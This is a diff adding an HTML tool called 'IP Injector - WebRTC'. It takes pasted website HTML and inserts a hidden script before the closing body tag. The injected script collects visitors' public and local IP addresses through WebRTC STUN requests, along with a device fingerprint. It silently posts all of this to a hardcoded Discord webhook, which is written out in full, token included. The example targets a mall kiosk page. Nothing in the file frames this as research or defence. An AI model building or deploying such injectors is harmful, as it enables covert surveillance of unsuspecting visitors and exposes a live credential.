@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Injector - WebRTC</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#0a0e27;font-family:monospace;padding:16px;}
+        .box{max-width:1400px;margin:0 auto;}
+        .bar{background:#1a1f3a;padding:12px 16px;border-radius:8px;margin-bottom:16px;display:flex;gap:12px;flex-wrap:wrap;align-items:center;}
+        input{background:#0d0f23;border:1px solid #2a2f4f;color:#fff;padding:8px 12px;border-radius:6px;width:260px;}
+        button{background:#4a3ab5;color:#fff;border:none;padding:8px 18px;border-radius:6px;cursor:pointer;font-weight:bold;}
+        button:hover{background:#5a4ac5;}
+        .copy{background:#2a5f3a;}
+        .grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+        .panel{background:#11152f;border-radius:8px;border:1px solid #2a2f4f;}
+        .panel h3{background:#1a1f3a;padding:10px 14px;color:#8b9dff;border-bottom:1px solid #2a2f4f;}
+        textarea{width:100%;height:520px;background:#0d0f23;border:none;color:#b8c7ff;font-family:monospace;font-size:12px;padding:12px;resize:vertical;}
+        .status{margin-top:12px;padding:10px;border-radius:6px;display:none;}
+        .status.ok{background:#1a3a2a;color:#6fcf97;display:block;}
+        .status.bad{background:#3a1a1a;color:#e74c3c;display:block;}
+        .info{background:#1a1f3a;padding:8px 12px;border-radius:6px;margin-top:16px;font-size:12px;color:#6b7bb5;}
+        @media(max-width:800px){.grid{grid-template-columns:1fr;}}
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="bar">
+        <span style="color:#8b9dff;">🏷️ LABEL:</span>
+        <input type="text" id="labelInp" value="Mall_Kiosk_1">
+        <button id="injectBtn">⚡ INJECT (WebRTC)</button>
+        <button id="copyBtn" class="copy">📋 COPY</button>
+    </div>
+    <div class="grid">
+        <div class="panel">
+            <h3>📥 YOUR HTML</h3>
+            <textarea id="inputHtml" placeholder="Paste website HTML here..."></textarea>
+        </div>
+        <div class="panel">
+            <h3>📤 OUTPUT (COPY THIS)</h3>
+            <textarea id="outputHtml" readonly style="background:#0a0c1f;" placeholder="Click INJECT"></textarea>
+        </div>
+    </div>
+    <div id="status" class="status"></div>
+    <div class="info">
+        🔗 <strong>Discord:</strong> https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds<br>
+        📡 <strong>WebRTC captures:</strong> Public IP • Local IP • All interfaces • Device fingerprint
+    </div>
+</div>
+
+<script>
+const WEBHOOK = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';
+
+function getTracker(label) {
+    let clean = label.replace(/\\/g,'\\\\').replace(/"/g,'\\"');
+    return '\n<!-- WEBRTC IP TRACKER -->\n<script>\n(function(){\n    const LABEL="' + clean + '", WEBHOOK="' + WEBHOOK + '", TS=new Date().toISOString(), URL=location.href, TITLE=document.title, REF=document.referrer||"direct";\n    function getIPs(cb){\n        let ips={local:[],public:[],all:[]};\n        try{\n            let pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"},{urls:"stun:stun1.l.google.com:19302"}]});\n            pc.createDataChannel("");\n            pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(e=>{});\n            pc.onicecandidate=e=>{\n                if(e.candidate){\n                    let c=e.candidate.candidate, m=c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);\n                    if(m) m.forEach(ip=>{\n                        if(!ips.all.includes(ip)&&ip!="0.0.0.0"){\n                            ips.all.push(ip);\n                            if(ip.startsWith("192.168.")||ip.startsWith("10.")||ip.startsWith("172.")||ip=="127.0.0.1") ips.local.push(ip);\n                            else ips.public.push(ip);\n                        }\n                    });\n                }\n            };\n            pc.onicegatheringstatechange=()=>{if(pc.iceGatheringState=="complete"){pc.close();cb(ips);}};\n            setTimeout(()=>{pc.close();cb(ips);},2500);\n        }catch(e){cb(ips);}\n    }\n    function getDevice(){\n        return{\n            ua:navigator.userAgent,\n            platform:navigator.platform,\n            lang:navigator.language,\n            screen:screen.width+"x"+screen.height,\n            tz:Intl.DateTimeFormat().resolvedOptions().timeZone,\n            cores:navigator.hardwareConcurrency||"?"\n        };\n    }\n    getIPs(async function(ips){\n        let dev=getDevice();\n        let finalIPs=ips.public.length?ips.public:ips.local;\n        let embed={\n            title:"📍 VISITOR - "+LABEL,\n            color:0xff4444,\n            fields:[\n                {name:"🌐 Public IP", value:ips.public.join(", ")||"none", inline:true},\n                {name:"🏠 Local IP", value:ips.local.join(", ")||"none", inline:true},\n                {name:"📱 Device", value:dev.ua.substring(0,70), inline:false},\n                {name:"💻 Info", value:"Platform: "+dev.platform+" | Lang: "+dev.lang+" | Screen: "+dev.screen, inline:false},\n                {name:"⚙️ Specs", value:"Cores: "+dev.cores+" | TZ: "+dev.tz, inline:true},\n                {name:"🔗 Page", value:URL.substring(0,80), inline:false},\n                {name:"🏷️ Kiosk", value:LABEL, inline:true},\n                {name:"⏱️ Time", value:TS, inline:true}\n            ]\n        };\n        try{\n            await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[embed],username:"WebRTC_Logger"})});\n        }catch(e){}\n    });\n})();\n<\/script>\n<!-- END TRACKER -->\n';
+}
+
+function inject(html, label) {
+    if(!html.trim()) throw new Error("Paste HTML");
+    if(!label.trim()) throw new Error("Enter label");
+    let script = getTracker(label);
+    if(html.indexOf('</body>')>-1) return html.replace('</body>', script+'\n</body>');
+    if(html.indexOf('</html>')>-1) return html.replace('</html>', script+'\n</html>');
+    return html + '\n' + script;
+}
+
+// DOM
+let inputArea = document.getElementById('inputHtml');
+let outputArea = document.getElementById('outputHtml');
+let labelInp = document.getElementById('labelInp');
+let injectBtn = document.getElementById('injectBtn');
+let copyBtn = document.getElementById('copyBtn');
+let statusDiv = document.getElementById('status');
+
+// Example HTML (clean, no tool code)
+inputArea.value = '<!DOCTYPE html>\n<html>\n<head><title>Mall Kiosk</title></head>\n<body>\n<h1>Welcome to Grand Mall</h1>\n<p>Find stores & events</p>\n</body>\n</html>';
+
+injectBtn.onclick = () => {
+    try {
+        let result = inject(inputArea.value, labelInp.value);
+        outputArea.value = result;
+        statusDiv.className = 'status ok';
+        statusDiv.textContent = '✅ INJECTED! WebRTC will capture IPs.';
+        setTimeout(() => statusDiv.className = 'status', 2500);
+    } catch(e) {
+        statusDiv.className = 'status bad';
+        statusDiv.textContent = '❌ ' + e.message;
+        setTimeout(() => statusDiv.className = 'status', 2500);
+    }
+};
+
+copyBtn.onclick = async () => {
+    let code = outputArea.value;
+    if(!code || code.trim()==="") {
+        statusDiv.className = 'status bad';
+        statusDiv.textContent = '❌ Nothing to copy';
+        setTimeout(() => statusDiv.className = 'status', 1500);
+        return;
+    }
+    try {
+        await navigator.clipboard.writeText(code);
+        statusDiv.className = 'status ok';
+        statusDiv.textContent = '📋 COPIED!';
+        setTimeout(() => statusDiv.className = 'status', 1500);
+    } catch(e) {
+        outputArea.select();
+        document.execCommand('copy');
+        statusDiv.className = 'status ok';
+        statusDiv.textContent = '📋 COPIED!';
+        setTimeout(() => statusDiv.className = 'status', 1500);
+    }
+};
+</script>
+</body>
+</html>
